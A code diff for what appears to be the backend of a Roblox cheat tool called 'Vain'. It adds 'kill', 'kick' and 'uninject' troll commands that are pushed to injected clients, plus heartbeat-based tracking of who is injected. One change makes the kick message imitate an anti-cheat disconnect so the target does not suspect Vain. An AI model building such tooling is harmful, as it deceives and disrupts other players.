@@ -56,7 +56,16 @@ export const TROLL_ACTIONS = {
 	invert: { timed: true,  message: false, blurb: "Invert their movement controls" },
 	blind:  { timed: true,  message: false, blurb: "Black out their screen" },
 	notify: { timed: false, message: true,  blurb: "Pop a Vain notification on their screen" },
-	kick:   { timed: false, message: true,  blurb: "Disconnect them from the game" },
+	kill:   { timed: false, message: false, blurb: "Kill their character" },
+	// Fixed reason, not sender-supplied: the point is that it reads as an
+	// anti-cheat action rather than as anything to do with Vain.
+	kick:   {
+		timed: false,
+		message: false,
+		fixedMessage: "You have been kicked due to suspicious client activity",
+		blurb: "Disconnect them from the game",
+	},
+	uninject: { timed: false, message: false, blurb: "Uninject their Vain immediately" },
 };
 
 export const ACTION_NAMES = Object.keys(TROLL_ACTIONS);
@@ -95,9 +104,10 @@ export function normalizeCommand({ action, seconds, message, from }) {
 		cmd.seconds = Math.min(MAX_SECONDS, Math.max(MIN_SECONDS, Number.isFinite(n) ? Math.floor(n) : DEFAULT_SECONDS));
 	}
 
-	if (spec.message) {
-		const text = sanitizeMessage(message);
-		cmd.message = text || (key === "kick" ? "Trolled by Vain." : "You've been trolled.");
+	if (spec.fixedMessage) {
+		cmd.message = spec.fixedMessage;
+	} else if (spec.message) {
+		cmd.message = sanitizeMessage(message) || "You've been trolled.";
 	}
 
 	return { cmd };
@@ -132,6 +142,61 @@ export async function enqueueCommand(env, robloxUserId, cmd) {
 	queue.push(cmd);
 	await env.KEYS.put(queueKey(robloxUserId), JSON.stringify(queue), { expirationTtl: QUEUE_TTL });
 	return { queued: queue.length };
+}
+
+// ---- presence ---------------------------------------------------------------
+// Every injected client already polls for its own commands, so that poll doubles
+// as a heartbeat and /list is just "who has a live heartbeat key".
+//
+// The TTLs below exist because of KV's write budget, not because 3 minutes is a
+// natural resolution: the free plan allows ~1k writes/day, and writing a key on
+// every 5s poll would burn that in under two user-hours. So a poll only writes
+// when the existing key is older than PRESENCE_REFRESH -- reads are 100x more
+// generous than writes, so checking first is nearly free. Raise both if you want
+// tighter "currently injected" resolution and have the write budget for it.
+const PRESENCE_TTL = 180;
+const PRESENCE_REFRESH = 150;
+const presenceKey = (robloxUserId) => `online:${robloxUserId}`;
+
+// The name/place come off the query string, i.e. from the client, i.e. from
+// anyone who can shape an HTTP request -- so treat them as display text only and
+// keep them short and inert. They land in a Discord message, never in a lookup.
+function sanitizeField(raw, max) {
+	return String(raw || "").replace(/[^\w .\-\[\]]/g, "").trim().slice(0, max);
+}
+
+/**
+ * Record that this player is injected right now. Stores the display fields in
+ * KV metadata so /list needs ONE list() call instead of a get() per player.
+ */
+export async function touchPresence(env, robloxUserId, { name, place }) {
+	const existing = await env.KEYS.getWithMetadata(presenceKey(robloxUserId));
+	const seenAt = existing && existing.metadata && existing.metadata.at;
+	if (seenAt && Date.now() - seenAt < PRESENCE_REFRESH * 1000) return;
+
+	await env.KEYS.put(presenceKey(robloxUserId), "1", {
+		expirationTtl: PRESENCE_TTL,
+		metadata: {
+			at: Date.now(),
+			name: sanitizeField(name, 32),
+			place: sanitizeField(place, 24),
+		},
+	});
+}
+
+/**
+ * Everyone with a live heartbeat, newest first.
+ */
+export async function listPresence(env) {
+	const { keys } = await env.KEYS.list({ prefix: "online:" });
+	return keys
+		.map((k) => ({
+			robloxUserId: k.name.slice("online:".length),
+			name: (k.metadata && k.metadata.name) || "",
+			place: (k.metadata && k.metadata.place) || "",
+			at: (k.metadata && k.metadata.at) || 0,
+		}))
+		.sort((a, b) => b.at - a.at);
 }
 
 /**
